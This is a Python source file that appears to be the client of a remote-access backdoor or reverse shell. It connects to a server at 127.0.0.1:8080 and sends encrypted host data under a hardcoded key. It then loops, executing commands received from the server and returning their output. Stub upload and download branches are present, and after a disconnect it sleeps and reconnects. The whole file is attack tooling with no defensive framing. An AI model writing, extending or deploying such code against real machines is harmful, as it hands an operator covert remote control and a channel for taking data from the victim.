from core.connect import  connect
from core.command import command
from core.crypter import cryptMsg
import time

def main():
	try:
		con = connect('127.0.0.1' , 8080)
		crypter = cryptMsg('this is my key b')
		comm = command()
		print(crypter.encrypt(comm.get_data() + '<end_of_data>'))
		con.send_serv(crypter.encrypt(comm.get_data() + '<end_of_data>'))
		while True :
			comm.flush_cmd()
			data = ''
			cmd = crypter.decrypt(con.recv_serv())
			if cmd == '' :
				continue
			if cmd == 'upload':
				print('uploading')
			if cmd == 'download':
				print('downloading')
			if cmd == 'exit' :
				data = 'bye'
			else:
				data = comm.get_data(cmd)
			print(data)
			con.send_serv(crypter.encrypt(data + '<end_of_data>'))
			if data.find('bye') != -1:
				break
		con.close_serv()
		time.sleep(10)
		main()
	except NameError as e:
		print('connection error ' ,e.args[0])

if __name__ == '__main__':
	main()

